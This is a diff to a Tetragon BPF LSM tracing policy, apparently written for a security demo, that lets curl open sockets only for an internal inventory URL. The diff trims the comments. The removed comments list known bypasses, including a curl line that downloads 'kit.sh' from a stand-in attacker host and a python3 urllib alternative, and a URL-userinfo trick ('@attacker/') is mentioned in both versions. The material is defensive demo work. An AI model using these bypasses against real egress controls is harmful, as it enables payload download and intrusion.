@@ -1,13 +1,5 @@
-# BPF LSM variant: Override here makes the kernel reject the call itself.
-# Needs 'bpf' in /sys/kernel/security/lsm. Does NOT need CONFIG_BPF_KPROBE_OVERRIDE.
-# Layer: tool download  (uses matchCmdArgs, new in Tetragon 1.8)
-# The app legitimately runs curl against the inventory service, so we can't
-# simply ban curl. Instead: curl may only open sockets when its first
-# argument (argv[1], index 0) is the internal inventory URL.
-#
-# Known bypasses worth showing on stage (see docs/GUIDE.md, Act 4):
-#   - extra URLs: curl http://inventory.../health http://attacker/kit.sh
-#   - a different tool: python3 -c "import urllib.request; ..."
+# BPF LSM version of policies/02: Override makes the connect itself fail.
+# Needs 'bpf' in /sys/kernel/security/lsm.
 apiVersion: cilium.io/v1alpha1
 kind: TracingPolicyNamespaced
 metadata:
@@ -36,8 +28,7 @@ spec:
             - index: 0
               operator: NotPrefix
               values:
-                # Trailing slash matters: without it,
-                # http://inventory.demo.svc.cluster.local:8080@attacker/ would pass.
+                # The trailing slash stops ...:8080@attacker/ from passing.
                 - "http://inventory.demo.svc.cluster.local:8080/"
           matchActions:
             - action: Override
